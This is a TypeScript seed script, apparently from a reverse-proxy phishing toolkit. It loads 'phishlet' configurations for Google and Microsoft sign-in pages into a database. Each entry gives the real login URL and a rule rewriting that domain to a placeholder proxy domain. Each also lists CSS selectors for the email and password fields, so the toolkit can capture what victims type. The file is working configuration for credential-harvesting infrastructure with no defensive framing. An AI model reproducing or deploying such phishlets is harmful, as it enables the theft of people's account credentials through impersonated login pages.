import 'reflect-metadata';
import { AppDataSource } from '../data-source';
import { Phishlet } from '../entities';

async function seed() {
    await AppDataSource.initialize();
    const phishletRepo = AppDataSource.getRepository(Phishlet);

    console.log('Seeding phishlets...');

    const phishlets = [
        {
            name: 'google',
            targetUrl: 'https://accounts.google.com',
            subdomains: ['accounts.google.com'],
            rewriteRules: [
                { from: 'accounts.google.com', to: 'your-proxy-domain.com' }
            ],
            credSelectors: {
                username: 'input[type="email"]',
                password: 'input[type="password"]',
            },
        },
        {
            name: 'microsoft',
            targetUrl: 'https://login.microsoftonline.com',
            subdomains: ['login.microsoftonline.com'],
            rewriteRules: [
                { from: 'login.microsoftonline.com', to: 'your-proxy-domain.com' }
            ],
            credSelectors: {
                username: 'input[type="email"]',
                password: 'input[type="password"]',
            },
        },
    ];

    await phishletRepo.clear();
    await phishletRepo.save(phishlets);

    console.log('Phishlets seeded successfully.');
    await AppDataSource.destroy();
}

seed().catch(error => console.error('Seeding failed:', error));
